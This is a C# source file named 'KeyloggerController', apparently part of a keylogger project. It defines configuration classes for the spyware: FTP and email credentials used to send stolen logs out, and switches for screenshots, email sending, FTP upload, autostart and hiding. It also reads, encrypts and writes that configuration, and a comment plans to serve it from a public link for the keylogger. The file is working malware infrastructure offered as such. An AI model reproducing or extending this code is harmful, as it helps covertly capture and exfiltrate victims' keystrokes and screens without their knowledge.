using System;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Bson;

namespace KeyloggerController
{
    class classJsonObj
    {
        static String strJsonDir = @"ADDYOURDIRECTORYHERE"; //LOCAL FILE TO GRAB THE MASTER JSON FILE
        static String strEncryptDir = @"ADDYOURDIRECTORYHERE"; //LOCAL FILE TO ENCRYPT TO (SHOULD LATER BE THE PUBLIC LINK FOR THE KEYLOGGER!)

        static string strEncryptedKey;  //Used to store the encrypted key

        //Class used to deserialize the Json and serialize using Bson
        public class classJson
        {
            //The json object will have access to the following objects and their fields:
            public FTP FTP { get; set; }
            public Email Email { get; set; }
            public Check Check { get; set; }
        }

        //Class used to store the FTP values
        public class FTP
        {
            public string Host { get; set; }
            public string User { get; set; }
            public string Pass { get; set; }
        }

        //Class used to store the Email values
        public class Email
        {
            public string Host { get; set; }
            public int Port { get; set; }
            public string Window { get; set; }
            public string FromEmail { get; set; }
            public string Pass { get; set; }
            public string ToEmail { get; set; }
        }

        //Class used to store the Check values
        public class Check
        {
            public bool TakeScreenshot { get; set; }
            public bool SpecificLogging { get; set; }
            public bool SendEmail { get; set; }
            public bool UploadFTP { get; set; }
            public bool Start { get; set; }
            public bool Hide { get; set; }
        }

        //To initialize/get the local Json as an object
        public static classJson initializeObj()
        {
            return JsonConvert.DeserializeObject<classJson>(File.ReadAllText(strJsonDir)); //Reads the json file
        }

        //To serialize and encrypt it using Bson
        public static void exportObj(classJson objJson)
        {
            try
            {
                strEncryptedKey = classGetEncryption.encryptBson(objJson); //Encrypts the json using bson

                File.WriteAllText(strEncryptDir, strEncryptedKey); //Updates the local encrypted json file
            }
            catch (Exception e) //If the file is already open
            {
                Console.WriteLine("Can't be written, preventing null: " + e);
            }
        }

        //To update the local Json 
        public static void updateLocalJson(classJson objJson)
        {
            File.WriteAllText(strJsonDir, JsonConvert.SerializeObject(objJson, Formatting.Indented)); //Updates the local json file (Needed for next initialization!)
        }
    }
}
